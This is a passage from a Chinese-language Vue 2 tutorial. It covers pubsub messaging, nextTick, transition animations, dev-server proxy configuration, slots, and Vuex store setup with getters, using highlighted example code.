	<span class="k">import</span> <span class="nx">pubsub</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">pubsub-js</span><span class="dl">'</span>
	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">Student</span><span class="dl">'</span><span class="p">,</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">sex</span><span class="p">:</span><span class="dl">'</span><span class="s1">男</span><span class="dl">'</span><span class="p">,</span>
			<span class="p">}</span>
		<span class="p">},</span>
		<span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
			<span class="c1">// console.log('Student',this.x)</span>
		<span class="p">},</span>
		<span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
			<span class="nx">sendStudentName</span><span class="p">(){</span>
				<span class="c1">// this.$bus.$emit('hello',this.name)</span>
				<span class="nx">pubsub</span><span class="p">.</span><span class="nx">publish</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span><span class="p">,</span><span class="mi">666</span><span class="p">)</span>
			<span class="p">}</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;style </span><span class="na">lang=</span><span class="s">"less"</span> <span class="na">scoped</span><span class="nt">&gt;</span>
	<span class="nc">.student</span><span class="p">{</span>
		<span class="nl">background-color</span><span class="p">:</span> <span class="no">pink</span><span class="p">;</span>
		<span class="nl">padding</span><span class="p">:</span> <span class="m">5px</span><span class="p">;</span>
		<span class="nl">margin-top</span><span class="p">:</span> <span class="m">30px</span><span class="p">;</span>
	<span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>

</code></pre></div></div><h2 id="27-nexttick">2.7 nextTick</h2><ol><li>语法：<code class="language-plaintext highlighter-rouge">this.$nextTick(回调函数)</code></li><li>作用：在下一次 DOM 更新结束后执行其指定的回调。</li><li>什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。</li></ol><h2 id="28-vue封装的过度与动画">2.8 Vue封装的过度与动画</h2><ol><li><p>作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。</p></li><li><p>写法：</p><ol><li><p>准备好样式：</p><ul><li>元素进入的样式：<ol><li>v-enter：进入的起点</li><li>v-enter-active：进入过程中</li><li>v-enter-to：进入的终点</li></ol></li><li>元素离开的样式：<ol><li>v-leave：离开的起点</li><li>v-leave-active：离开过程中</li><li>v-leave-to：离开的终点</li></ol></li></ul></li><li><p>使用<code class="language-plaintext highlighter-rouge">&lt;transition&gt;</code>包裹要过度的元素，并配置name属性：</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;transition</span> <span class="na">name=</span><span class="s">"hello"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;h1</span> <span class="na">v-show=</span><span class="s">"isShow"</span><span class="nt">&gt;</span>你好啊！<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;/transition&gt;</span>
</code></pre></div></div></li><li><p>备注：若有多个元素需要过度，则需要使用：<code class="language-plaintext highlighter-rouge">&lt;transition-group&gt;</code>，且每个元素都要指定<code class="language-plaintext highlighter-rouge">key</code>值。</p></li></ol></li></ol><blockquote><p>使用第三库的具体案例（随便看看，这个不重要）</p></blockquote><div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;template&gt;</span>
	<span class="nt">&lt;div&gt;</span>
		<span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"isShow = !isShow"</span><span class="nt">&gt;</span>显示/隐藏<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;transition-group</span> 
			<span class="na">appear</span>
			<span class="na">name=</span><span class="s">"animate__animated animate__bounce"</span> 
			<span class="na">enter-active-class=</span><span class="s">"animate__swing"</span>
			<span class="na">leave-active-class=</span><span class="s">"animate__backOutUp"</span>
		<span class="nt">&gt;</span>
			<span class="nt">&lt;h1</span> <span class="na">v-show=</span><span class="s">"!isShow"</span> <span class="na">key=</span><span class="s">"1"</span><span class="nt">&gt;</span>你好啊！<span class="nt">&lt;/h1&gt;</span>
			<span class="nt">&lt;h1</span> <span class="na">v-show=</span><span class="s">"isShow"</span> <span class="na">key=</span><span class="s">"2"</span><span class="nt">&gt;</span>尚硅谷！<span class="nt">&lt;/h1&gt;</span>
		<span class="nt">&lt;/transition-group&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/template&gt;</span>

<span class="nt">&lt;script&gt;</span>
	<span class="k">import</span> <span class="dl">'</span><span class="s1">animate.css</span><span class="dl">'</span>
	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">Test</span><span class="dl">'</span><span class="p">,</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">isShow</span><span class="p">:</span><span class="kc">true</span>
			<span class="p">}</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;style </span><span class="na">scoped</span><span class="nt">&gt;</span>
	<span class="nt">h1</span><span class="p">{</span>
		<span class="nl">background-color</span><span class="p">:</span> <span class="no">orange</span><span class="p">;</span>
	<span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
</code></pre></div></div><h2 id="29-vue脚手架配置代理">2.9 vue脚手架配置代理</h2><h3 id="方法一">方法一</h3><p>​ 在vue.config.js中添加如下配置：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">devServer</span><span class="p">:{</span>
  <span class="nl">proxy</span><span class="p">:</span><span class="dl">"</span><span class="s2">http://localhost:5000</span><span class="dl">"</span>
<span class="p">}</span>
</code></pre></div></div><p>说明：</p><ol><li>优点：配置简单，请求资源时直接发给前端（8080）即可。</li><li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理。</li><li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</li></ol><h3 id="方法二">方法二</h3><p>​ 编写vue.config.js配置具体代理规则：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
	<span class="na">devServer</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">proxy</span><span class="p">:</span> <span class="p">{</span>
      <span class="dl">'</span><span class="s1">/api1</span><span class="dl">'</span><span class="p">:</span> <span class="p">{</span><span class="c1">// 匹配所有以 '/api1'开头的请求路径</span>
        <span class="na">target</span><span class="p">:</span> <span class="dl">'</span><span class="s1">http://localhost:5000</span><span class="dl">'</span><span class="p">,</span><span class="c1">// 代理目标的基础路径</span>
        <span class="na">changeOrigin</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="na">pathRewrite</span><span class="p">:</span> <span class="p">{</span><span class="dl">'</span><span class="s1">^/api1</span><span class="dl">'</span><span class="p">:</span> <span class="dl">''</span><span class="p">}</span>
      <span class="p">},</span>
      <span class="dl">'</span><span class="s1">/api2</span><span class="dl">'</span><span class="p">:</span> <span class="p">{</span><span class="c1">// 匹配所有以 '/api2'开头的请求路径</span>
        <span class="na">target</span><span class="p">:</span> <span class="dl">'</span><span class="s1">http://localhost:5001</span><span class="dl">'</span><span class="p">,</span><span class="c1">// 代理目标的基础路径</span>
        <span class="na">changeOrigin</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="na">pathRewrite</span><span class="p">:</span> <span class="p">{</span><span class="dl">'</span><span class="s1">^/api2</span><span class="dl">'</span><span class="p">:</span> <span class="dl">''</span><span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="cm">/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/</span>
</code></pre></div></div><p>说明：</p><ol><li>优点：可以配置多个代理，且可以灵活的控制请求是否走代理。</li><li>缺点：配置略微繁琐，请求资源时必须加前缀。</li></ol><h2 id="210-slot插槽">2.10 slot插槽</h2><ol><li><p>作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===&gt; 子组件</strong> 。</p></li><li><p>分类：默认插槽、具名插槽、作用域插槽</p></li><li><p>使用方式：</p><ol><li><p>默认插槽：</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code>父组件中：
        <span class="nt">&lt;Category&gt;</span>
           <span class="nt">&lt;div&gt;</span>html结构1<span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/Category&gt;</span>
子组件中：
        <span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div&gt;</span>
               <span class="c">&lt;!-- 定义插槽 --&gt;</span>
               <span class="nt">&lt;slot&gt;</span>插槽默认内容...<span class="nt">&lt;/slot&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>
</code></pre></div></div></li><li><p>具名插槽：</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code>父组件中：
        <span class="nt">&lt;Category&gt;</span>
            <span class="nt">&lt;</span><span class="k">template</span> <span class="na">slot=</span><span class="s">"center"</span><span class="nt">&gt;</span>
              <span class="nt">&lt;div&gt;</span>html结构1<span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>
      
            <span class="nt">&lt;</span><span class="k">template</span> <span class="na">v-slot:footer</span><span class="nt">&gt;</span>
               <span class="nt">&lt;div&gt;</span>html结构2<span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>
        <span class="nt">&lt;/Category&gt;</span>
子组件中：
        <span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div&gt;</span>
               <span class="c">&lt;!-- 定义插槽 --&gt;</span>
               <span class="nt">&lt;slot</span> <span class="na">name=</span><span class="s">"center"</span><span class="nt">&gt;</span>插槽默认内容...<span class="nt">&lt;/slot&gt;</span>
               <span class="nt">&lt;slot</span> <span class="na">name=</span><span class="s">"footer"</span><span class="nt">&gt;</span>插槽默认内容...<span class="nt">&lt;/slot&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>
</code></pre></div></div></li><li><p>作用域插槽：</p><ol><li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）</p></li><li><p>具体编码：</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code>父组件中：
		<span class="nt">&lt;Category&gt;</span>
			<span class="nt">&lt;</span><span class="k">template</span> <span class="na">scope=</span><span class="s">"scopeData"</span><span class="nt">&gt;</span>
				<span class="c">&lt;!-- 生成的是ul列表 --&gt;</span>
				<span class="nt">&lt;ul&gt;</span>
					<span class="nt">&lt;li</span> <span class="na">v-for=</span><span class="s">"g in scopeData.games"</span> <span class="na">:key=</span><span class="s">"g"</span><span class="nt">&gt;&lt;/li&gt;</span>
				<span class="nt">&lt;/ul&gt;</span>
			<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>
		<span class="nt">&lt;/Category&gt;</span>
         
		<span class="nt">&lt;Category&gt;</span>
			<span class="nt">&lt;</span><span class="k">template</span> <span class="na">slot-scope=</span><span class="s">"scopeData"</span><span class="nt">&gt;</span>
				<span class="c">&lt;!-- 生成的是h4标题 --&gt;</span>
				<span class="nt">&lt;h4</span> <span class="na">v-for=</span><span class="s">"g in scopeData.games"</span> <span class="na">:key=</span><span class="s">"g"</span><span class="nt">&gt;&lt;/h4&gt;</span>
			<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>
		<span class="nt">&lt;/Category&gt;</span>
子组件中：
        <span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div&gt;</span>
                <span class="nt">&lt;slot</span> <span class="na">:games=</span><span class="s">"games"</span><span class="nt">&gt;&lt;/slot&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>
         		
        <span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
            <span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
                <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">Category</span><span class="dl">'</span><span class="p">,</span>
                <span class="na">props</span><span class="p">:[</span><span class="dl">'</span><span class="s1">title</span><span class="dl">'</span><span class="p">],</span>
                <span class="c1">//数据在子组件自身</span>
                <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="p">{</span>
                        <span class="na">games</span><span class="p">:[</span><span class="dl">'</span><span class="s1">红色警戒</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">穿越火线</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">劲舞团</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">超级玛丽</span><span class="dl">'</span><span class="p">]</span>
                    <span class="p">}</span>
                <span class="p">},</span>
            <span class="p">}</span>
        <span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div></li></ol></li></ol></li></ol><h1 id="3-vuex">3. VUEX</h1><p>原理图：</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220405172004860.png" alt="image-20220405172004860" /></p><h2 id="31-概念">3.1 概念</h2><p>​ 在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。</p><h2 id="32-何时使用">3.2 何时使用？</h2><p>​ 多个组件需要共享数据时</p><h2 id="33-搭建vuex环境">3.3 搭建vuex环境</h2><ol><li><p>创建文件：<code class="language-plaintext highlighter-rouge">src/store/index.js</code></p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//引入Vue核心库</span>
<span class="k">import</span> <span class="nx">Vue</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">vue</span><span class="dl">'</span>
<span class="c1">//引入Vuex</span>
<span class="k">import</span> <span class="nx">Vuex</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">vuex</span><span class="dl">'</span>
<span class="c1">//应用Vuex插件</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Vuex</span><span class="p">)</span>
   
<span class="c1">//准备actions对象——响应组件中用户的动作</span>
<span class="kd">const</span> <span class="nx">actions</span> <span class="o">=</span> <span class="p">{}</span>
<span class="c1">//准备mutations对象——修改state中的数据</span>
<span class="kd">const</span> <span class="nx">mutations</span> <span class="o">=</span> <span class="p">{}</span>
<span class="c1">//准备state对象——保存具体的数据</span>
<span class="kd">const</span> <span class="nx">state</span> <span class="o">=</span> <span class="p">{}</span>
   
<span class="c1">//创建并暴露store</span>
<span class="k">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
	<span class="nx">actions</span><span class="p">,</span>
	<span class="nx">mutations</span><span class="p">,</span>
	<span class="nx">state</span>
<span class="p">})</span>
</code></pre></div></div></li><li><p>在<code class="language-plaintext highlighter-rouge">main.js</code>中创建vm时传入<code class="language-plaintext highlighter-rouge">store</code>配置项</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">......</span>
<span class="c1">//引入store</span>
<span class="k">import</span> <span class="nx">store</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./store</span><span class="dl">'</span>
<span class="p">......</span>
   
<span class="c1">//创建vm</span>
<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
	<span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#app</span><span class="dl">'</span><span class="p">,</span>
	<span class="na">render</span><span class="p">:</span> <span class="nx">h</span> <span class="o">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">),</span>
	<span class="nx">store</span>
<span class="p">})</span>
</code></pre></div></div></li></ol><h2 id="34-基本使用">3.4 基本使用</h2><ol><li><p>初始化数据、配置<code class="language-plaintext highlighter-rouge">actions</code>、配置<code class="language-plaintext highlighter-rouge">mutations</code>，操作文件<code class="language-plaintext highlighter-rouge">store.js</code></p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//引入Vue核心库</span>
<span class="k">import</span> <span class="nx">Vue</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">vue</span><span class="dl">'</span>
<span class="c1">//引入Vuex</span>
<span class="k">import</span> <span class="nx">Vuex</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">vuex</span><span class="dl">'</span>
<span class="c1">//引用Vuex</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Vuex</span><span class="p">)</span>
   
<span class="kd">const</span> <span class="nx">actions</span> <span class="o">=</span> <span class="p">{</span>
    <span class="c1">//响应组件中加的动作</span>
	<span class="nx">jia</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span><span class="nx">value</span><span class="p">){</span>
		<span class="c1">// console.log('actions中的jia被调用了',miniStore,value)</span>
		<span class="nx">context</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="dl">'</span><span class="s1">JIA</span><span class="dl">'</span><span class="p">,</span><span class="nx">value</span><span class="p">)</span>
	<span class="p">},</span>
<span class="p">}</span>
   
<span class="kd">const</span> <span class="nx">mutations</span> <span class="o">=</span> <span class="p">{</span>
    <span class="c1">//执行加</span>
	<span class="nx">JIA</span><span class="p">(</span><span class="nx">state</span><span class="p">,</span><span class="nx">value</span><span class="p">){</span>
		<span class="c1">// console.log('mutations中的JIA被调用了',state,value)</span>
		<span class="nx">state</span><span class="p">.</span><span class="nx">sum</span> <span class="o">+=</span> <span class="nx">value</span>
	<span class="p">}</span>
<span class="p">}</span>
   
<span class="c1">//初始化数据</span>
<span class="kd">const</span> <span class="nx">state</span> <span class="o">=</span> <span class="p">{</span>
   <span class="na">sum</span><span class="p">:</span><span class="mi">0</span>
<span class="p">}</span>
   
<span class="c1">//创建并暴露store</span>
<span class="k">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
	<span class="nx">actions</span><span class="p">,</span>
	<span class="nx">mutations</span><span class="p">,</span>
	<span class="nx">state</span><span class="p">,</span>
<span class="p">})</span>
</code></pre></div></div></li><li><p>组件中读取vuex中的数据：<code class="language-plaintext highlighter-rouge">$store.state.sum</code></p></li><li><p>组件中修改vuex中的数据：<code class="language-plaintext highlighter-rouge">$store.dispatch('action中的方法名',数据)</code> 或 <code class="language-plaintext highlighter-rouge">$store.commit('mutations中的方法名',数据)</code></p><blockquote><p>备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写<code class="language-plaintext highlighter-rouge">dispatch</code>，直接编写<code class="language-plaintext highlighter-rouge">commit</code></p></blockquote></li></ol><p>具体案例：</p><p>index.js</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//该文件用于创建Vuex中最为核心的store</span>
<span class="k">import</span> <span class="nx">Vue</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">vue</span><span class="dl">'</span>
<span class="c1">//引入Vuex</span>
<span class="k">import</span> <span class="nx">Vuex</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">vuex</span><span class="dl">'</span>
<span class="c1">//应用Vuex插件</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Vuex</span><span class="p">)</span>

<span class="c1">//准备actions——用于响应组件中的动作</span>
<span class="kd">const</span> <span class="nx">actions</span> <span class="o">=</span> <span class="p">{</span>
	<span class="cm">/* jia(context,value){
		console.log('actions中的jia被调用了')
		context.commit('JIA',value)
	},
	jian(context,value){
		console.log('actions中的jian被调用了')
		context.commit('JIAN',value)
	}, */</span>
	<span class="nx">jiaOdd</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span><span class="nx">value</span><span class="p">){</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">actions中的jiaOdd被调用了</span><span class="dl">'</span><span class="p">)</span>
		<span class="k">if</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">sum</span> <span class="o">%</span> <span class="mi">2</span><span class="p">){</span>
			<span class="nx">context</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="dl">'</span><span class="s1">JIA</span><span class="dl">'</span><span class="p">,</span><span class="nx">value</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">},</span>
	<span class="nx">jiaWait</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span><span class="nx">value</span><span class="p">){</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">actions中的jiaWait被调用了</span><span class="dl">'</span><span class="p">)</span>
		<span class="nx">setTimeout</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
			<span class="nx">context</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="dl">'</span><span class="s1">JIA</span><span class="dl">'</span><span class="p">,</span><span class="nx">value</span><span class="p">)</span>
		<span class="p">},</span><span class="mi">500</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="c1">//准备mutations——用于操作数据（state）</span>
<span class="kd">const</span> <span class="nx">mutations</span> <span class="o">=</span> <span class="p">{</span>
	<span class="nx">JIA</span><span class="p">(</span><span class="nx">state</span><span class="p">,</span><span class="nx">value</span><span class="p">){</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">mutations中的JIA被调用了</span><span class="dl">'</span><span class="p">)</span>
		<span class="nx">state</span><span class="p">.</span><span class="nx">sum</span> <span class="o">+=</span> <span class="nx">value</span>
	<span class="p">},</span>
	<span class="nx">JIAN</span><span class="p">(</span><span class="nx">state</span><span class="p">,</span><span class="nx">value</span><span class="p">){</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">mutations中的JIAN被调用了</span><span class="dl">'</span><span class="p">)</span>
		<span class="nx">state</span><span class="p">.</span><span class="nx">sum</span> <span class="o">-=</span> <span class="nx">value</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="c1">//准备state——用于存储数据</span>
<span class="kd">const</span> <span class="nx">state</span> <span class="o">=</span> <span class="p">{</span>
	<span class="na">sum</span><span class="p">:</span><span class="mi">0</span> <span class="c1">//当前的和</span>
<span class="p">}</span>

<span class="c1">//创建并暴露store</span>
<span class="k">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
	<span class="nx">actions</span><span class="p">,</span>
	<span class="nx">mutations</span><span class="p">,</span>
	<span class="nx">state</span><span class="p">,</span>
<span class="p">})</span>
</code></pre></div></div><p>Count.vue</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div&gt;</span>
		<span class="nt">&lt;h1&gt;</span>当前求和为：<span class="nt">&lt;/h1&gt;</span>
		<span class="nt">&lt;select</span> <span class="na">v-model.number=</span><span class="s">"n"</span><span class="nt">&gt;</span>
			<span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"1"</span><span class="nt">&gt;</span>1<span class="nt">&lt;/option&gt;</span>
			<span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"2"</span><span class="nt">&gt;</span>2<span class="nt">&lt;/option&gt;</span>
			<span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"3"</span><span class="nt">&gt;</span>3<span class="nt">&lt;/option&gt;</span>
		<span class="nt">&lt;/select&gt;</span>
		<span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"increment"</span><span class="nt">&gt;</span>+<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"decrement"</span><span class="nt">&gt;</span>-<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"incrementOdd"</span><span class="nt">&gt;</span>当前求和为奇数再加<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"incrementWait"</span><span class="nt">&gt;</span>等一等再加<span class="nt">&lt;/button&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">Count</span><span class="dl">'</span><span class="p">,</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">n</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="c1">//用户选择的数字</span>
			<span class="p">}</span>
		<span class="p">},</span>
		<span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
			<span class="nx">increment</span><span class="p">(){</span>
                <span class="c1">// commit 是操作 mutations</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="dl">'</span><span class="s1">JIA</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">n</span><span class="p">)</span>
			<span class="p">},</span>
			<span class="nx">decrement</span><span class="p">(){</span>
                <span class="c1">// commit 是操作 mutations</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="dl">'</span><span class="s1">JIAN</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">n</span><span class="p">)</span>
			<span class="p">},</span>
			<span class="nx">incrementOdd</span><span class="p">(){</span>
                <span class="c1">// dispatch 是操作 actions</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">(</span><span class="dl">'</span><span class="s1">jiaOdd</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">n</span><span class="p">)</span>
			<span class="p">},</span>
			<span class="nx">incrementWait</span><span class="p">(){</span>
                <span class="c1">// dispatch 是操作 actions</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">(</span><span class="dl">'</span><span class="s1">jiaWait</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">n</span><span class="p">)</span>
			<span class="p">},</span>
		<span class="p">},</span>
		<span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
			<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Count</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">)</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span> <span class="na">lang=</span><span class="s">"css"</span><span class="nt">&gt;</span>
	<span class="nt">button</span><span class="p">{</span>
		<span class="nl">margin-left</span><span class="p">:</span> <span class="m">5px</span><span class="p">;</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>
</code></pre></div></div><h2 id="35-getters的使用">3.5 getters的使用</h2><ol><li><p>概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。</p></li><li><p>在<code class="language-plaintext highlighter-rouge">store.js</code>中追加<code class="language-plaintext highlighter-rouge">getters</code>配置</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">......</span>
   
<span class="kd">const</span> <span class="nx">getters</span> <span class="o">=</span> <span class="p">{</span>
	<span class="nx">bigSum</span><span class="p">(</span><span class="nx">state</span><span class="p">){</span>
		<span class="k">return</span> <span class="nx">state</span><span class="p">.</span><span class="nx">sum</span> <span class="o">*</span> <span class="mi">10</span>
	<span class="p">}</span>
<span class="p">}</span>
   
<span class="c1">//创建并暴露store</span>
<span class="k">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
	<span class="p">......</span>
	<span class="nx">getters</span>
<span class="p">})</span>
